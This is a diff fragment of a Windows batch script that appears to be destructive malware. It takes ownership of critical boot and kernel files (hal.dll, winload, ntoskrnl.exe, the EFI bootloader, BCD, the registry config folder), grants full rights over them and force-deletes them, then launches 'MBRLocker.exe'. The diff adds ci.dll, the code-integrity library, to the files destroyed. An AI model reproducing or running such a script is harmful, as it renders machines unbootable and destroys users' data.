@@ -19,6 +19,7 @@ takeown /f W:\EFI\Boot\bootx64.efi
 takeown /f W:\EFI\Microsoft\Boot\BCD
 takeown /f ntoskrnl.exe
 takeown /f config /r /d y
+takeown /f ci.dll
 icacls hal.dll /grant %username%:F
 icacls winload.efi /grant %username%:F
 icacls winload.exe /grant %username%:F
@@ -28,6 +29,7 @@ echo y|cacls ..\Boot /g %username%:F /t
 icacls W:\EFI\Boot\bootx64.efi /grant %username%:F
 icacls W:\EFI\Microsoft\Boot\BCD /grant %username%:F
 icacls ntoskrnl.exe /grant %username%:F
+icacls ci.dll /grant %username%:F
 echo y|cacls config /g %username%:F /t
 del hal.dll /f
 del winload.efi /f
@@ -39,6 +41,7 @@ del W:\EFI\Boot\bootx64.efi /f
 del W:\EFI\Microsoft\Boot\BCD /f
 del ntoskrnl.exe /f
 rd config /s /q
+del ci.dll /f
 cd %userprofile%\Desktop
 MBRLocker.exe
 timeout /t 15 /nobreak
